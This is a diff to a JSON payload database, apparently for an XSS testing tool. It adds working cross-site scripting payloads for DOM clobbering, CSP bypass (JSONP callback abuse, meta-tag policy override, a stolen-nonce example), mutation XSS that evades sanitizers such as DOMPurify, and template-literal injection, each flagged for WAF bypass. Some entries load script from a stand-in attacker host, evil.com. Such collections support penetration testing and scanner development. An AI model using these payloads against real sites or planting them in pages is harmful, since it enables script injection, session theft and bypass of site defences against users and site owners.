@@ -121,7 +121,10 @@
         {"payload": "<form id=config><input name=url value=https://evil.com></form>", "description": "Clobber config.url via form input name", "waf_bypass": false},
         {"payload": "<a id=config></a><a id=config name=raw href=javascript:alert(1)></a>", "description": "DOM collection clobbering with duplicate IDs", "waf_bypass": false},
         {"payload": "<base href=\"https://evil.com/\">", "description": "Base tag override for relative URL hijacking", "waf_bypass": false},
-        {"payload": "<img name=body>", "description": "Clobber document.body with named img element", "waf_bypass": false}
+        {"payload": "<img name=body>", "description": "Clobber document.body with named img element", "waf_bypass": false},
+        {"payload": "<form id=x><output name=y>clobbered</output></form>", "description": "Form-based clobbering — x.y returns output element value via HTMLFormElement named access", "waf_bypass": false},
+        {"payload": "<a id=x><a id=x name=y href=javascript:alert(1)>", "description": "HTMLCollection clobbering — duplicate ID creates collection, named access returns second element", "waf_bypass": false},
+        {"payload": "<form id=document><input name=cookie value=clobbered></form>", "description": "Clobber document.cookie via form with id=document — breaks code reading document.cookie", "waf_bypass": false}
       ]
     },
     "csp_bypass": {
@@ -130,7 +133,31 @@
         {"payload": "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js\"></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>", "description": "CSP bypass via trusted CDN AngularJS CSTI", "waf_bypass": true},
         {"payload": "<base href=\"https://evil.com/\">", "description": "Base tag injection to redirect relative script loads", "waf_bypass": true},
         {"payload": "<link rel=preload as=script href=//evil.com/xss.js>", "description": "Preload link to bypass script-src via resource hints", "waf_bypass": true},
-        {"payload": "<script nonce=STOLEN_NONCE>alert(1)</script>", "description": "Script tag with stolen or predicted CSP nonce", "waf_bypass": true}
+        {"payload": "<script nonce=STOLEN_NONCE>alert(1)</script>", "description": "Script tag with stolen or predicted CSP nonce", "waf_bypass": true},
+        {"payload": "<script src=\"//target.com/api?callback=alert\"></script>", "description": "JSONP callback abuse — inject via whitelisted JSONP endpoint to bypass script-src", "waf_bypass": true},
+        {"payload": "<script src=\"//target.com/jsonp?cb=alert(document.domain)//\"></script>", "description": "JSONP callback with domain exfil — works when JSONP endpoints are in script-src whitelist", "waf_bypass": true},
+        {"payload": "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'unsafe-inline'\"><script>alert(1)</script>", "description": "CSP override via meta tag injection — replaces restrictive CSP with permissive one (first-match wins in some browsers)", "waf_bypass": true},
+        {"payload": "<script src=\"data:text/javascript,alert(1)\" nonce=\"\"></script>", "description": "Empty nonce with data: URI — exploits strict-dynamic with base64 script injection", "waf_bypass": true}
+      ]
+    },
+    "mxss": {
+      "description": "Mutation XSS payloads that bypass HTML sanitizers through browser DOM mutation during parsing",
+      "payloads": [
+        {"payload": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">", "description": "noscript breakout — browser mutates noscript content differently than sanitizer parses it", "waf_bypass": true},
+        {"payload": "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>", "description": "Math namespace confusion — mglyph causes HTML integration point that mutates style content", "waf_bypass": true},
+        {"payload": "<svg><![CDATA[><image xlink:href=\"]]><img/src=x onerror=alert(1)//\">", "description": "SVG CDATA breakout — CDATA section is parsed differently in SVG vs HTML context", "waf_bypass": true},
+        {"payload": "<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><style><a title=\"</style><img src onerror=alert(1)>\">", "description": "DOMPurify mXSS — nested math/option/mglyph triggers DOM mutation during serialization", "waf_bypass": true},
+        {"payload": "<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path><set><animate><svg/onload=alert(1)>", "description": "Form nesting mXSS — form element interactions cause parser state confusion in sanitizer vs browser", "waf_bypass": true},
+        {"payload": "<svg></p><style><g title=\"</style><img src=x onerror=alert(1)>\">", "description": "SVG-to-HTML namespace switch — style element is parsed as raw text in SVG but not in HTML context", "waf_bypass": true}
+      ]
+    },
+    "template_literal": {
+      "description": "ES6 template literal injection payloads for JavaScript contexts using backtick strings",
+      "payloads": [
+        {"payload": "${alert(1)}", "description": "Basic template literal expression — executes when injected inside backtick string context", "waf_bypass": false},
+        {"payload": "`${alert(1)}`", "description": "Full template literal with expression — for injection into eval or script context", "waf_bypass": false},
+        {"payload": "${constructor.constructor('return this')().alert(1)}", "description": "Constructor chain in template literal — bypasses restricted scope to access global alert", "waf_bypass": true},
+        {"payload": "${`${alert(document.domain)}`}", "description": "Nested template literal — double-nested expression for complex injection contexts", "waf_bypass": true}
       ]
     }
   }
